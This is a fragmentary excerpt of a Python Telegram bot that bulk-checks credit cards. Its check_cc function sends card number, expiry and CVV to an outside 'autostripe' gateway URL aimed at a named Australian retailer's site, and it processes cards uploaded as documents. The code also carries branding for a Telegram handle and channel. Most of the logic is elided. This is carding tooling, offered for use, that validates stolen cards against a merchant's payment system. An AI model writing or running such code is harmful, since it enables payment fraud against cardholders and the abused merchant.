...
def check_cc(cc_number, month, year, cvv):
    ...
    # Your API endpoint
    url = f"https://rockyysoon.onrender.com/gateway=autostripe/key=rockysoon?site=buildersdiscountwarehouse.com.au&cc={cc_data}"
...
async def handle_document(update: Update, context: CallbackContext):
    ...
    try:
        ...
        await update.message.reply_text("𝘼𝙡𝙡 𝘾𝙘𝙨 𝘼𝙧𝙚 𝘾𝙝𝙚𝙘𝙠𝙞𝙣𝙜... 𝙗𝙤𝙩 𝙗𝙮 @BLAZE_X_007")
...
💎 𝘽𝙤𝙩 𝘽𝙮 ➜ @BLAZE\\_X\\_007
☑️ 𝙅𝙤𝙞𝙣 𝙊𝙪𝙧 𝘾𝙝𝙖𝙣𝙣𝙚𝙡 𝘼𝙣𝙙 𝙎𝙪𝙥𝙥𝙤𝙧𝙩 ➜ @BLAZE\\_X\\_007
...
async def handle_button(update: Update, context: CallbackContext):
    ...
    # STOP CHECK BUTTON - FIXED PARSING
        ...
        await query.edit_message_text("❌ 𝘾𝙝𝙚𝙘𝙠 𝘾𝙖𝙣𝙘𝙚𝙡𝙡𝙚𝙙 !!")
...
def main():
    ...
    if not TOKEN:
        ...
        print("Please set your Telegram bot token in the Secrets.")
        return
    
    if OWNER_ID == 0:
        print("❌ ERROR: TELEGRAM_OWNER_ID environment variable is not set!")
        print("Please set your Telegram owner ID in the Secrets.")
        return
    ...
    try:
        ...
        if "Conflict" in str(e) or "terminated by other getUpdates" in str(e):
            print("\n⚠️  Another instance of this bot is already running elsewhere!")
            print("💡 To fix: Stop the other bot instance or wait a few minutes.")
        else:
